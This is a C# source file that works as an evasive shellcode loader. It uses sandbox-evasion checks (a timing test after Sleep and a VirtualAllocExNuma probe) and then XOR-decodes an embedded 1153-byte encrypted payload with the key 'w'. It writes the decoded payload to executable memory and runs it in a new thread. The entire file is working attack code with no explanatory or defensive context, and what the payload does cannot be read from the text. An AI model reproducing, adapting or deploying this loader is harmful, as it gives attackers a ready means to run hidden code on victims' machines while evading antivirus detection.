using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
namespace Platform
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(),
            IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            byte[] buf = new byte[1153] {
0x3f,0x46,0xac,0x3e,0xfe,0x93,0x3e,0xc8,0x81,0x08,0x54,0x48,0xce,0x11,0xf7,
0x41,0x11,0x36,0xf6,0x93,0xb7,0x80,0xac,0xb0,0x3e,0x78,0xd9,0x73,0x53,0xc4,
0xfd,0x3a,0xfc,0x33,0x53,0x7f,0x3f,0x88,0xbc,0x3a,0x46,0x0b,0xaf,0x6c,0x3f,
0xf2,0xac,0x02,0x84,0xc8,0x81,0xb7,0x05,0xff,0xfc,0xbe,0xf8,0xc0,0xe4,0xbb,
0xb7,0xd5,0xbc,0x3c,0x63,0xe7,0x49,0xd5,0xab,0xfe,0xe5,0xb6,0xf4,0x02,0xd3,
0x84,0x01,0xc1,0xbf,0xf4,0x08,0x02,0xcb,0x5c,0x05,0x45,0x32,0xbe,0xbe,0x4c,
0x47,0x65,0x04,0x22,0x0b,0xba,0xc4,0x6c,0x7d,0xa7,0x41,0xab,0x1c,0x41,0xe6,
0xf6,0xe7,0xd0,0x80,0x2f,0x59,0x6a,0x1d,0x61,0xf2,0xa4,0x6f,0xa3,0x1c,0xf8,
0xa1,0xf7,0x11,0x3e,0x06,0x8c,0xfc,0x49,0xe8,0x50,0x8b,0xf5,0xcb,0x2a,0xb2,
0x83,0x68,0x65,0x3c,0xbc,0x46,0x13,0x9a,0xde,0x47,0x61,0x46,0xa4,0x7c,0xd1,
0x70,0x6d,0xa1,0xc3,0x8f,0x50,0x8e,0x05,0xde,0xf7,0x3c,0xed,0xff,0x3c,0x23,
0xdf,0x16,0x15,0xc0,0x7e,0x56,0x27,0xe4,0x9c,0x6d,0x23,0x52,0xe0,0xce,0x91,
0xde,0x10,0x6d,0xaf,0x39,0xad,0x83,0x5a,0x0e,0x65,0x6c,0xd3,0x31,0xec,0xff,
0x85,0x87,0x49,0x6c,0xa9,0x11,0xd0,0x3d,0xaa,0xdb,0xbc,0x99,0xf5,0x8b,0xcf,
0x97,0x15,0x8b,0x96,0xb7,0x85,0xca,0x62,0x8a,0x77,0x9e,0xc7,0xca,0xcd,0xf2,
0x0e,0xc6,0x53,0x3d,0x10,0xf0,0x1a,0x4f,0x2a,0x7e,0x68,0x0f,0x51,0xb7,0x4b,
0xc2,0x62,0x06,0x8f,0x91,0x7e,0xb7,0x31,0xca,0x5f,0xc4,0xac,0x5c,0x93,0x82,
0x70,0x12,0x37,0x27,0x3b,0x39,0x53,0xaa,0x58,0xb3,0x57,0xa0,0x36,0x1f,0x26,
0xfa,0x3a,0xba,0x3f,0x1d,0x3e,0x91,0x69,0xcb,0x7e,0x9a,0x47,0x45,0xb6,0x96,
0x8e,0x41,0xcc,0xba,0xf1,0x0d,0x3f,0xaf,0xab,0x12,0xff,0xba,0x8b,0x1d,0x02,
0x6d,0x6f,0xc2,0xfe,0x63,0x6e,0x1a,0x9e,0xeb,0x41,0xd6,0x2c,0x45,0xe1,0x5d,
0xb9,0x0b,0x6f,0x4a,0x15,0xa7,0x86,0xa5,0x60,0x67,0x3b,0xd4,0x9e,0xdc,0xe1,
0xd1,0xd7,0x03,0x6f,0x78,0x14,0xf6,0x56,0x98,0x5f,0x3a,0x6b,0x24,0x01,0xf6,
0x2c,0x80,0x62,0xf8,0x56,0x63,0xe1,0x2f,0x5f,0xdc,0x5b,0xdf,0xc5,0x33,0x4b,
0x46,0x70,0x3c,0x46,0x1d,0xf3,0xab,0xb6,0x15,0x96,0x81,0xd2,0x79,0x5c,0xdd,
0x93,0xba,0x00,0xec,0x47,0xa7,0x4c,0xe2,0x4a,0xb6,0x13,0x75,0x3a,0x50,0xf4,
0xcd,0x4e,0xcc,0x33,0x4b,0xf8,0xb8,0x7a,0x57,0x60,0x90,0x93,0xde,0x36,0x9b,
0xdc,0x4f,0x43,0x3e,0x55,0x3a,0x02,0xaa,0x2d,0x29,0xd3,0xf9,0xd8,0xa1,0x6e,
0xa0,0x03,0xa7,0x9a,0xde,0x65,0x63,0x1e,0xfd,0x03,0x23,0x3b,0x90,0xd2,0x2f,
0x97,0xc4,0x3f,0x51,0x17,0x94,0xa8,0x1f,0xac,0x06,0x3c,0xf9,0x32,0xe0,0x62,
0x9f,0x5d,0x72,0xd7,0x63,0x0e,0x0f,0x97,0xf1,0x7f,0x0c,0x90,0x67,0xa2,0x03,
0xfb,0x57,0xe7,0x4e,0x3c,0x48,0xf4,0x0b,0xca,0xd6,0x8e,0xc3,0x3c,0xc4,0x9f,
0x46,0x87,0x1c,0x43,0x8d,0x3c,0xb8,0x92,0x01,0xfb,0xe3,0xf9,0x92,0x38,0xc2,
0x9a,0x3b,0x39,0x03,0xd8,0xa6,0x99,0xd4,0x4d,0x20,0xee,0xff,0x90,0x64,0x2c,
0x65,0xf5,0xbe,0xa6,0xce,0x42,0x40,0x35,0xaf,0xf7,0x8c,0xa6,0x74,0xc2,0x3d,
0x2c,0x6c,0x2e,0xbe,0xce,0xa9,0xdd,0x14,0xb4,0x6c,0x2e,0x9e,0xbe,0xb7,0x9f,
0x92,0x37,0x6e,0xed,0xdd,0x2e,0x53,0xac,0x44,0x01,0x26,0x89,0xcc,0xaf,0x3e,
0x59,0x28,0x3c,0x25,0x64,0x0e,0x03,0xad,0xd8,0xae,0x2f,0x04,0x2e,0xae,0xd2,
0xbe,0xc1,0x6d,0x7c,0xf4,0xc3,0x6d,0x96,0xe7,0x9b,0x27,0x72,0xa1,0xd7,0xec,
0xee,0xff,0x1b,0xa5,0xf5,0x24,0xa5,0xec,0xa6,0x7a,0x50,0x51,0x1a,0x6c,0xa4,
0x3c,0xaa,0x74,0xd0,0x05,0x2d,0x6d,0xa4,0x3c,0x65,0xb7,0x88,0xc6,0x2b,0x6c,
0x5a,0x25,0xa3,0xce,0x59,0x64,0xf6,0x10,0x2d,0xa4,0xef,0x29,0xd8,0x14,0xbd,
0x88,0xe4,0x2d,0x27,0xf2,0xd1,0x24,0xbc,0x1c,0x45,0x99,0x1f,0xb3,0x93,0x69,
0x59,0x2c,0xe0,0xd5,0x3f,0x8a,0x48,0x7d,0x39,0xaf,0xe5,0xc8,0xa7,0xfe,0x40,
0x43,0x3c,0xaf,0xa9,0xa4,0xaa,0x74,0xd0,0x39,0x34,0x25,0x75,0xad,0x65,0xfb,
0x18,0x64,0x25,0x6c,0xa4,0x3c,0xaf,0xa7,0xce,0x7c,0x27,0x65,0xfd,0xad,0xb7,
0xbe,0xca,0x6d,0xfe,0xc8,0x85,0xad,0xbc,0x00,0x70,0x7d,0x3c,0x7d,0xff,0xa4,
0x65,0xed,0x79,0x6e,0x82,0xdb,0x5a,0xb1,0xa6,0xce,0x4b,0x76,0x34,0x9a,0xd2,
0x85,0x80,0x96,0xfe,0x40,0x09,0x24,0xe4,0xba,0xa6,0x76,0x71,0x6c,0xba,0xe6,
0xe9,0x9b,0xc8,0xf8,0x6f,0xf0,0x2e,0x77,0xed,0x65,0x0f,0xac,0xca,0x68,0x4c,
0xe4,0xe8,0xdd,0x27,0xac,0xc3,0x6c,0xc7,0x1e,0xf3,0x95,0x49,0xff,0x90,0x25,
0x7d,0xdb,0x70,0x04,0xe1,0xff,0x90,0x25,0x4c,0x13,0x97,0xc2,0xdf,0xc6,0xbe,
0x14,0x4a,0x10,0x8b,0xdd,0xdf,0xcc,0x90,0x7f,0x35,0xad,0x64,0xa5,0x29,0x3f,
0x2b,0x24,0x7d,0x24,0xe8,0xdd,0x27,0xac,0xc3,0x4f,0x7e,0x77,0xec,0x56,0xb9,
0x76,0x0f,0xe3,0x7d,0x24,0xa5,0xec,0x11,0x2a,0x78,0x1b,0x7d,0x24,0xa5,0xc3,
0x88,0xa8,0xf5,0x55,0x0e,0x77,0xdd,0xba,0xac,0xa9,0xca,0x76,0x3e,0x48,0xe8,
0xa5,0xa3,0xbb,0xa1,0x61,0x29,0x53,0xd7,0xdf,0xdf,0x8e,0xdc,0x40,0x17,0x48,
0xc7,0xae,0xa0,0xba,0xe4,0x6c,0x1a,0x5c,0xd0,0xdf,0x97,0xad,0xd1,0x1c,0x45,
0x40,0xe8,0x8a,0x8d,0xb1,0xa6,0x68,0x15,0x76,0xca,0xd4,0x86,0x8d,0xd3,0x69,
0x7d,0x6c,0x2c,0x2d,0xbd,0xa5,0xd1,0x7d,0x30,0x15,0x6c,0xbf,0xa6,0x47,0x90,
0x17,0xd5,0xa0,0xa5,0xec,0xee,0xff,0xc0,0x76,0x2e,0x6d,0x62,0x2e,0x05,0xaa,
0xbe,0x1e,0x82,0xf1,0xed,0x65,0x28,0x95,0x9a,0x7a,0x35,0xad,0x54,0x86,0xf1,
0xa5,0xc2,0x4d,0xfd,0x17,0xa5,0xec,0xa7,0x76,0x70,0x4f,0x79,0x65,0xfc,0xa5,
0x54,0x8a,0xd6,0xbb,0xfb,0x24,0xa5,0xec,0xee,0x00,0x45,0x68,0x4c,0xe4,0xf6,
0xb6,0xa6,0x76,0x61,0x68,0x4c,0xed,0xe8,0xdd,0x27,0xac,0xc3,0x6c,0xba,0xe6,
0x88,0xea,0xf6,0x84,0x6f,0xf0,0xf8,0xe4,0xd0,0xf3,0xa6,0x38,0x51,0xad,0x6e,
0x24,0xa5,0xa5,0x54,0xbb,0x60,0x10,0x9d,0x24,0xa5,0xec,0xee,0x00,0x45,0x6d,
0x82,0xeb,0xd1,0xee,0x05,0x55,0x78,0x70,0x7d,0x24,0xa5,0xbf,0xb7,0x95,0xd0,
0x7f,0x34,0xad,0x74,0x2d,0x0c,0xef,0xd9,0xe2,0xbd,0x24,0xb5,0xec,0xee,0xb6,
0x2a,0x7d,0xd9,0x77,0x40,0xec,0xee,0xff,0x90,0xda,0xa8,0x6c,0x36,0xbf,0xbd,
0xb7,0x19,0xc2,0x35,0xad,0x54,0xa4,0x67,0x25,0xd9,0xe2,0xbd,0x24,0x85,0xec,
0xee,0xb6,0x19,0xdc,0x34,0x9e,0xb7,0x7a,0x67,0x1d,0x90,0x25,0x7d,0x24,0x5a,
0x39,0xa6,0x7c,0x54,0x05,0xf8,0xe4,0xd1,0x5e,0x88,0x74,0x97,0x6d,0x7c,0xe7,
0x20,0x2c,0x9b,0x2d,0xc8,0xe6,0x25,0x4e,0xa5,0xb5,0x55,0x1f,0x8d,0x0f,0x77,
0x65,0x2c,0x36,0x11,0x2a,0xde,0x64,0xc7,0x6e,0xea,0x5c,0xa6,0x6a,0xa8,0xce,
0xff,0x13,0x3f,0x21,0x98,0x56,0x0f,0x6e,0x51,0x79,0x5d,0xe6,0x9d,0x8f,0x46,
0xd9,0xfc,0xbc,0x9f,0x7e,0xbd,0xec,0xe5,0x7f,0xf2,0x1d,0xd3,0x02 };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'w');
            }
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
